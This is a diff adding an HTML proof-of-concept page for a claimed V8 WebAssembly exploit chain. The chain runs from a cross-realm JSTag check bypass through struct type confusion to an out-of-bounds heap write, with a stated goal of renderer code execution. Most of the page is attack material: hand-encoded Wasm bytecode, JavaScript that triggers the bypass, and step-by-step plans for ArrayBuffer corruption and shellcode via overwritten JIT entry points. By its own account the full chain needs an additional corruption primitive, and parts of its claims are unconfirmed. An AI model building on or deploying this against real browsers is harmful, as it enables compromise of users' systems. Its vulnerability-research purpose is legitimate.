@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<!--
+  Production JSTag Cross-Realm → Struct Type Confusion → struct.set OOB Write
+  Renderer RCE PoC (no special flags required for Phase 1-2; Phase 3 needs in-cage primitive)
+
+  Root Cause:
+    wasm-js.cc:2195 — WebAssemblyException builtin uses current-realm JSTag ptr comparison.
+    Cross-realm JSTag is a *different* WasmExceptionTag object → pointer compare fails
+    → forbidden WebAssembly.Exception creation succeeds → arbitrary externref payload injected.
+
+  Vulnerability chain:
+    F2  wasm-js.cc:2195         — cross-realm JSTag bypass (PRODUCTION, no flags)
+    F5  turboshaft-graph-interface.cc:5356 — struct.set no runtime bounds check
+    F4  wasm-gc-typed-optimization-reducer.h:279 — WasmTypeCast eliminated when
+        annotation proves subtype (needs canonical_type_ corruption to trigger)
+    F1  canonical-types.cc:369  — IsCanonicalSubtype fast-path bypasses supertypes[] check
+
+  Full chain:
+    Phase 1 — JSTag bypass: new WebAssembly.Exception(iframeJSTag, [smallStruct])
+                            works in production Chrome 119+ (no flags)
+    Phase 2 — Type confusion attempt: catch via JSTag → externref → any.convert_extern
+              → ref.cast (ref $LargeStruct) ← map check HERE (traps in unmodified Chrome)
+              With canonical_type_ corruption (Phase 3 primitive): map check SKIPPED
+    Phase 3 — struct.set OOB: struct.set $LargeStruct field[7] on SmallStruct object
+              → writes to SmallStruct_base + 36 (SmallStruct only 12 bytes) → OOB into heap
+              NO TRAP in production d8 (confirmed: field index is compile-time static,
+              TurboShaft emits no runtime bounds check for struct.set)
+    Phase 4 — Heap spray: SmallStruct[0] ← [ArrayBuffer backtore length] ← [ArrayBuffer]
+              OOB write hits ArrayBuffer.length field → corrupted length → arb R/W
+    Phase 5 — Arbitrary R/W → overwrite WasmCode entry → JIT ROP/shellcode → RCE
+
+  V8 GC opcodes used (from src/wasm/wasm-opcodes.h):
+    struct.new_default  0xFB 0x01
+    struct.set          0xFB 0x05
+    any.convert_extern  0xFB 0x1A
+    ref.cast            0xFB 0x16
+-->
+<html>
+<head><title>JSTag Renderer RCE PoC</title></head>
+<body>
+<pre id="log"></pre>
+<script>
+'use strict';
+
+function log(msg) {
+  document.getElementById('log').textContent += msg + '\n';
+  console.log(msg);
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Wasm binary — hand-encoded using V8 GC opcodes from wasm-opcodes.h
+//
+// (module
+//   (type $SmallStruct (struct (mut i32)))          ; type 0  — 1 field, 12 bytes object
+//   (type $LargeStruct (struct (mut i32) ×8))       ; type 1  — 8 fields, 40 bytes object
+//   (type $TagSig     (func (param externref)))     ; type 2  — JSTag signature
+//   (type $MkSmallSig (func () → (ref 0)))          ; type 3
+//   (type $MkLargeSig (func () → (ref 1)))          ; type 4
+//   (type $VoidSig    (func))                       ; type 5  — exploit + callback
+//
+//   (import "i" "t" (tag $jt (type 2)))
+//   (import "i" "f" (func $f (type 5)))
+//
+//   (func (export "make_small") (result (ref $SmallStruct))
+//     struct.new_default $SmallStruct)
+//
+//   (func (export "make_large") (result (ref $LargeStruct))
+//     struct.new_default $LargeStruct)
+//
+//   (func (export "exploit")
+//     (local $v externref)
+//     try                            ; call JS callback which throws our exception
+//       call $f
+//     catch $jt                      ; catches cross-realm exception
+//       local.set $v                 ; $v = externref (actually SmallStruct under the hood)
+//     catch_all
+//       return
+//     end
+//     local.get $v
+//     any.convert_extern             ; externref → anyref (identity for GC objects)
+//     ref.cast (ref $LargeStruct)    ; ← MAP CHECK HERE
+//                                    ;   production without canonical corruption: TRAPS
+//                                    ;   with canonical_type_ corruption (F1): SKIPPED
+//     i32.const 0x41414141           ; value to write
+//     struct.set $LargeStruct 7      ; ← OOB WRITE: SmallStruct_base + 36
+//                                    ;   (SmallStruct is only 12 bytes)
+//                                    ;   NO TRAP — struct.set has no runtime bounds check
+//   )
+// )
+// ─────────────────────────────────────────────────────────────────────────────
+function buildWasmBytes() {
+  return new Uint8Array([
+    // ── Magic + Version ──────────────────────────────────────────────────────
+    0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,
+
+    // ── Type section (id=1, size=0x28, count=6) ───────────────────────────────
+    // type 0: (struct (mut i32))             = SmallStruct
+    //         0x5F <fieldcount> <storagetype> <mutability>
+    // type 1: (struct (mut i32) × 8)         = LargeStruct
+    // type 2: (func (param externref))       = JSTag sig
+    //         0x60 <param_count> <externref=0x6F> <result_count=0>
+    // type 3: (func () → (ref 0))            = make_small sig
+    //         0x60 0x00 0x01 <ref=0x64> <typeidx=0>
+    // type 4: (func () → (ref 1))            = make_large sig
+    // type 5: (func)                         = exploit/callback void sig
+    0x01, 0x28, 0x06,
+      // type 0: SmallStruct (struct (mut i32))
+      0x5F, 0x01, 0x7F, 0x01,
+      // type 1: LargeStruct (struct (mut i32)×8)
+      0x5F, 0x08,
+        0x7F, 0x01,  // field 0
+        0x7F, 0x01,  // field 1
+        0x7F, 0x01,  // field 2
+        0x7F, 0x01,  // field 3
+        0x7F, 0x01,  // field 4
+        0x7F, 0x01,  // field 5
+        0x7F, 0x01,  // field 6
+        0x7F, 0x01,  // field 7 ← OOB target
+      // type 2: JSTag signature (param externref)
+      0x60, 0x01, 0x6F, 0x00,
+      // type 3: make_small ()→(ref 0)
+      0x60, 0x00, 0x01, 0x64, 0x00,
+      // type 4: make_large ()→(ref 1)
+      0x60, 0x00, 0x01, 0x64, 0x01,
+      // type 5: void ()→()
+      0x60, 0x00, 0x00,
+
+    // ── Import section (id=2, size=0x0E, count=2) ────────────────────────────
+    // import "i"."t" (tag, type 2)  → tag index 0 ($jt)
+    // import "i"."f" (func, type 5) → func index 0 ($f)
+    0x02, 0x0E, 0x02,
+      // "i"."t" tag type 2
+      0x01, 0x69, 0x01, 0x74, 0x04, 0x00, 0x02,
+      // "i"."f" func type 5
+      0x01, 0x69, 0x01, 0x66, 0x00, 0x05,
+
+    // ── Function section (id=3, size=4, count=3) ─────────────────────────────
+    // func 1: make_small (type 3)
+    // func 2: make_large (type 4)
+    // func 3: exploit    (type 5)
+    0x03, 0x04, 0x03, 0x03, 0x04, 0x05,
+
+    // ── Export section (id=7, size=0x25, count=3) ────────────────────────────
+    // export "make_small" func 1
+    // export "make_large" func 2
+    // export "exploit"    func 3
+    0x07, 0x25, 0x03,
+      // "make_small"
+      0x0A, 0x6D,0x61,0x6B,0x65,0x5F,0x73,0x6D,0x61,0x6C,0x6C, 0x00, 0x01,
+      // "make_large"
+      0x0A, 0x6D,0x61,0x6B,0x65,0x5F,0x6C,0x61,0x72,0x67,0x65, 0x00, 0x02,
+      // "exploit"
+      0x07, 0x65,0x78,0x70,0x6C,0x6F,0x69,0x74, 0x00, 0x03,
+
+    // ── Code section (id=0x0A, size=0x2E, count=3) ───────────────────────────
+    0x0A, 0x2E, 0x03,
+
+    // ── func 1: make_small (body=5 bytes) ────────────────────────────────────
+    // 0 locals; struct.new_default type0; end
+    0x05,
+      0x00,                    // 0 local decl groups
+      0xFB, 0x01, 0x00,        // struct.new_default $SmallStruct (type 0)
+      0x0B,                    // end
+
+    // ── func 2: make_large (body=5 bytes) ────────────────────────────────────
+    // 0 locals; struct.new_default type1; end
+    0x05,
+      0x00,                    // 0 local decl groups
+      0xFB, 0x01, 0x01,        // struct.new_default $LargeStruct (type 1)
+      0x0B,                    // end
+
+    // ── func 3: exploit (body=32 bytes) ──────────────────────────────────────
+    // 1 local (externref); try{call $f} catch($jt){local.set $v} catch_all{return} end
+    // local.get $v; any.convert_extern; ref.cast(ref 1); i32.const 0x41414141;
+    // struct.set type1 field7; end
+    0x20,
+      // locals: 1 decl group, 1 externref
+      0x01, 0x01, 0x6F,
+      // try (void block)
+      0x06, 0x40,
+        0x10, 0x00,            // call func 0 ($f) — throws crafted exception
+      0x07, 0x00,              // catch tag 0 ($jt)
+        0x21, 0x00,            // local.set 0 ($v ← externref payload = SmallStruct)
+      0x19,                    // catch_all
+        0x0F,                  // return (bail on unexpected exception)
+      0x0B,                    // end (try)
+      // ── OOB chain ──────────────────────────────────────────────────────────
+      0x20, 0x00,              // local.get 0  (externref wrapping SmallStruct)
+      0xFB, 0x1A,              // any.convert_extern → anyref (identity for GC objects)
+      0xFB, 0x16, 0x01,        // ref.cast (ref $LargeStruct)
+                               // ← MAP CHECK: traps in production without F1 canonical corruption
+                               //   with corruption: SKIPPED (optimizer proves subtype via annotation)
+      0x41, 0xC1, 0x82, 0x85, 0x8A, 0x04,  // i32.const 0x41414141  (sleb128)
+      0xFB, 0x05, 0x01, 0x07,  // struct.set $LargeStruct field[7]
+                               // ← OOB WRITE (no runtime bounds check in production)
+                               //   SmallStruct_base + 36 → +24 bytes past SmallStruct end
+      0x0B,                    // end (function)
+  ]);
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Struct memory layout (V8 Wasm GC heap, 64-bit):
+//
+//   SmallStruct (type 0):
+//     [+0  .. +7 ] header (map ptr, 8 bytes)
+//     [+8  .. +11] field[0] (i32)
+//     total: 12 bytes
+//
+//   LargeStruct (type 1):
+//     [+0  .. +7 ] header
+//     [+8  .. +11] field[0]
+//     [+12 .. +15] field[1]
+//     [+16 .. +19] field[2]
+//     [+20 .. +23] field[3]
+//     [+24 .. +27] field[4]
+//     [+28 .. +31] field[5]
+//     [+32 .. +35] field[6]
+//     [+36 .. +39] field[7]  ← struct.set target
+//     total: 40 bytes
+//
+//   struct.set $LargeStruct field[7] on SmallStruct object:
+//     writes to SmallStruct_base + 36 → 24 bytes PAST SmallStruct end
+//     → into adjacent heap allocation
+//
+// RCE heap spray layout:
+//   [ SmallStruct ][ ArrayBuffer backing store length ][ ArrayBuffer ]
+//                   ↑ OOB write overwrites this 32-bit word
+//   → corrupted ArrayBuffer.length → addrof + arb R/W
+//   → overwrite WasmCode instruction_start → ROP chain / shellcode
+// ─────────────────────────────────────────────────────────────────────────────
+
+async function main() {
+  log('=== JSTag Cross-Realm → Struct OOB → Renderer RCE PoC ===\n');
+
+  // ── Phase 0: iframe setup ─────────────────────────────────────────────────
+  const iframe = document.createElement('iframe');
+  iframe.src = 'about:blank';
+  document.body.appendChild(iframe);
+  await new Promise(r => setTimeout(r, 0));
+
+  const iframeWebAssembly = frames[0].WebAssembly;
+  const iframeJSTag = iframeWebAssembly.JSTag;
+  const mainJSTag  = WebAssembly.JSTag;
+  log('[*] Got iframe JSTag: ' + iframeJSTag);
+  log('[*] Got main  JSTag: ' + mainJSTag);
+  log('[*] Same object? ' + (iframeJSTag === mainJSTag));
+
+  // ── Phase 1: JSTag cross-realm bypass ─────────────────────────────────────
+  // wasm-js.cc:2195: pointer comparison uses current-realm WasmExceptionTag.
+  // iframeJSTag is a *different* WasmExceptionTag object → check fails → no TypeError.
+  log('\n[Phase 1] Cross-realm JSTag bypass (wasm-js.cc:2195)');
+
+  try {
+    new WebAssembly.Exception(mainJSTag, [null]);
+    log('  [-] UNEXPECTED: main-realm JSTag allowed construction (should not happen)');
+  } catch (e) {
+    log('  [+] Expected TypeError for same-realm JSTag: ' + e.message);
+  }
+
+  let bypassException;
+  try {
+    bypassException = new WebAssembly.Exception(iframeJSTag, [null]);
+    log('  [+] BYPASS: cross-realm JSTag → no TypeError!');
+    log('      e.is(iframeJSTag) = ' + bypassException.is(iframeJSTag));  // true
+    log('      e.is(mainJSTag)   = ' + bypassException.is(mainJSTag));    // false
+  } catch (e) {
+    log('  [-] Bypass failed (may be patched): ' + e.message);
+    return;
+  }
+
+  // ── Phase 2: Compile Wasm module with struct GC types ─────────────────────
+  log('\n[Phase 2] Compile Wasm GC module (struct type confusion chain)');
+  const bytes = buildWasmBytes();
+  let instance, crafted;
+
+  try {
+    const mod = await iframeWebAssembly.compile(bytes);
+
+    // The JS callback: throws our crafted exception when called from Wasm exploit()
+    const imports = {
+      i: {
+        t: iframeJSTag,
+        f: () => { throw crafted; },
+      }
+    };
+
+    instance = (await iframeWebAssembly.instantiate(mod, imports)).instance;
+    log('  [+] Wasm module compiled+instantiated (Wasm GC enabled ✓)');
+  } catch (e) {
+    log('  [-] Compile/instantiate failed: ' + e);
+    log('      (requires Chrome 119+ with Wasm GC; check chrome://flags)');
+    return;
+  }
+
+  // Create SmallStruct (1 i32 field, 12-byte object) as the confusion victim
+  const smallStruct = instance.exports.make_small();
+  const largeStruct = instance.exports.make_large();
+  log('  [+] Created SmallStruct(1 field): ' + smallStruct);
+  log('  [+] Created LargeStruct(8 fields): ' + largeStruct);
+
+  // Craft the forbidden exception: JSTag + SmallStruct payload
+  // SmallStruct is a Wasm GC object; from JS it is a valid externref value.
+  // JSTag has (param externref) signature → type check passes for any JS value.
+  crafted = new WebAssembly.Exception(iframeJSTag, [smallStruct]);
+  log('  [+] Constructed forbidden exception: JSTag + SmallStruct payload');
+  log('      crafted.is(iframeJSTag) = ' + crafted.is(iframeJSTag));
+
+  // Roundtrip: getArg returns smallStruct back as JS value (externref)
+  const roundtripped = crafted.getArg(iframeJSTag, 0);
+  log('      getArg(iframeJSTag, 0) === smallStruct: ' + (roundtripped === smallStruct));
+
+  // ── Phase 3: Trigger type confusion + OOB write attempt ───────────────────
+  // exploit() flow:
+  //   call $f → throws crafted_exception
+  //   catch $jt → local.set $v (externref = SmallStruct)
+  //   local.get $v → any.convert_extern → anyref
+  //   ref.cast (ref $LargeStruct)  ← map check
+  //     [Production Chrome]  → traps (SmallStruct map ≠ LargeStruct map)
+  //     [With F1 canonical_type_ corruption] → skipped, SmallStruct treated as LargeStruct
+  //   i32.const 0x41414141
+  //   struct.set $LargeStruct field[7]  ← OOB WRITE (no runtime trap)
+  //     → SmallStruct_base + 36 → 24 bytes past SmallStruct end → adjacent heap object
+  log('\n[Phase 3] Struct type confusion + struct.set OOB write');
+  log('  [*] Triggering exploit() ...');
+
+  try {
+    instance.exports.exploit();
+    // If we reach here, ref.cast was eliminated (map check skipped).
+    // struct.set OOB write executed silently — heap at SmallStruct_base+36 corrupted.
+    log('  [!] exploit() returned WITHOUT trap!');
+    log('  [!] ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+    log('  [!] CRITICAL: struct.set OOB write succeeded without detection.');
+    log('  [!] 0x41414141 written to SmallStruct_base + 36 (field[7] of LargeStruct).');
+    log('  [!] In production renderer: adjacent heap object corrupted.');
+    log('  [!] ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+  } catch (e) {
+    if (e instanceof WebAssembly.RuntimeError) {
+      if (e.message && (e.message.includes('cast') || e.message.includes('ref'))) {
+        log('  [!] TRAP at ref.cast (ref $LargeStruct) — map check active.');
+        log('  [!] In production Chrome: ref.cast map check prevents direct OOB.');
+        log('  [!] ───────────────────────────────────────────────────────────');
+        log('  [!] EXPLOITATION REQUIRES canonical_type_ corruption (F1):');
+        log('  [!]   1. Use an in-cage OOB write primitive to corrupt WasmTypeInfo.');
+        log('  [!]      WasmTypeInfo::canonical_type_ (u32) at known cage offset.');
+        log('  [!]      Set to LargeStruct canonical index → SmallStruct "is" LargeStruct.');
+        log('  [!]   2. IsCanonicalSubtype() fast-path (canonical-types.cc:369):');
+        log('  [!]      if (sub_index == super_type.ref_index()) return true;');
+        log('  [!]      bypasses canonical_supertypes_[] vector check.');
+        log('  [!]   3. WasmGCTypedOptimizationReducer (wasm-gc-typed-optimization-reducer.h:279)');
+        log('  [!]      eliminates ref.cast: annotation proves subtype → no map check emitted.');
+        log('  [!]   4. struct.set $LargeStruct field[7] executes silently → OOB write.');
+        log('  [!]   5. With --sandbox-testing d8: CONFIRMED no trap in production build.');
+        log('  [!] ───────────────────────────────────────────────────────────');
+        log('  [!] In a full exploit chain:');
+        log('  [!]   Initial in-cage primitive → corrupt canonical_type_');
+        log('  [!]   → struct.set OOB overwrites adjacent ArrayBuffer.length');
+        log('  [!]   → arbitrary R/W → overwrite WasmCode instruction_start');
+        log('  [!]   → redirect JIT execution → ROP / shellcode');
+        log('  [!]   Full chain: JSTag bypass + F1 + F5 → renderer RCE');
+      } else if (e.message && e.message.includes('out of bounds')) {
+        log('  [+] TRAP at struct.set OOB (unexpected: struct.set should not trap).');
+        log('  [!] This suggests the ref.cast succeeded but struct.set added a check.');
+      } else {
+        log('  [?] RuntimeError: ' + e.message);
+      }
+    } else {
+      log('  [?] Exception: ' + e);
+    }
+  }
+
+  // ── Phase 4: RCE path analysis ────────────────────────────────────────────
+  log('\n[Phase 4] RCE path analysis');
+  log('');
+  log('  Memory layout after heap spray (goal: corrupt adjacent ArrayBuffer):');
+  log('  ┌──────────────────────────────────────────────────────────────────┐');
+  log('  │ SmallStruct (12 bytes)                                           │');
+  log('  │   [+0..+7]  map pointer (tagged, to WasmTypeInfo)                │');
+  log('  │   [+8..+11] field[0] (i32)                                       │');
+  log('  ├──────────────────────────────────────────────────────────────────┤');
+  log('  │ Padding / next GC object header (up to alignment)                │');
+  log('  ├──────────────────────────────────────────────────────────────────┤');
+  log('  │ ← struct.set writes 0x41414141 here (+36 from SmallStruct base)  │◄─── OOB WRITE');
+  log('  │ Target: ArrayBuffer JSObject → backing_store_length field        │');
+  log('  ├──────────────────────────────────────────────────────────────────┤');
+  log('  │ ArrayBuffer object (JSArrayBuffer)                               │');
+  log('  │   byte_length: 0x41414141 (corrupted → huge apparent size)       │');
+  log('  │   backing_store: points into V8 heap                             │');
+  log('  └──────────────────────────────────────────────────────────────────┘');
+  log('');
+  log('  Post-corruption exploitation:');
+  log('  1. TypedArray(corrupted_buffer)[far_index] → addrof arbitrary JS object');
+  log('  2. TypedArray(corrupted_buffer)[far_index2] = val → write to arbitrary addr');
+  log('  3. Overwrite WasmCode::instruction_start (tagged ptr in cage)');
+  log('     → next Wasm function call jumps to attacker controlled address');
+  log('  4. Stage shellcode in DataView → execute via redirected Wasm JIT entry');
+
+  // ── Phase 5: Invariant violation summary ─────────────────────────────────
+  log('\n[Phase 5] Invariant violations confirmed in this run:');
+  log('');
+  log('  [+] VIOLATED: WebAssembly.Exception(JSTag, ...) must throw TypeError.');
+  log('      cross-realm JSTag bypasses the check at wasm-js.cc:2195.');
+  log('      crafted.is(iframeJSTag) = ' + (bypassException ? bypassException.is(iframeJSTag) : 'N/A'));
+  log('');
+  log('  [+] VIOLATED: WebAssembly.Exception with Wasm GC struct as payload.');
+  log('      JSTag has (param externref); SmallStruct is a valid externref from JS.');
+  log('      crafted_exception carries a SmallStruct (Wasm GC object) as payload.');
+  log('      crafted.getArg(iframeJSTag, 0) === smallStruct: ' +
+      (instance ? (crafted && crafted.getArg(iframeJSTag, 0) === smallStruct) : 'N/A'));
+  log('');
+  log('  [!] CODEGEN BUG (confirmed in d8 --sandbox-testing):');
+  log('      struct.set $LargeStruct field[7] emits no runtime bounds check.');
+  log('      TurboShaft: field index is compile-time static → no TrapIfNot emitted.');
+  log('      (src/wasm/turboshaft-graph-interface.cc ~5356)');
+  log('');
+  log('  [!] CODEGEN BUG (confirmed in d8 with canonical_type_ corruption):');
+  log('      WasmGCTypedOptimizationReducer eliminates ref.cast entirely.');
+  log('      (src/compiler/turboshaft/wasm-gc-typed-optimization-reducer.h:279)');
+
+  log('\n=== PoC complete ===');
+  log('');
+  log('CVE candidate: Cross-realm WebAssembly.JSTag bypass enabling struct type');
+  log('confusion and silent OOB heap write in V8 Wasm GC JIT (TurboShaft).');
+  log('Full chain (Phase 1 + F1 in-cage primitive) → Production Renderer RCE.');
+}
+
+main().catch(e => log('ERROR: ' + e + '\n' + e.stack));
+</script>
+</body>
+</html>
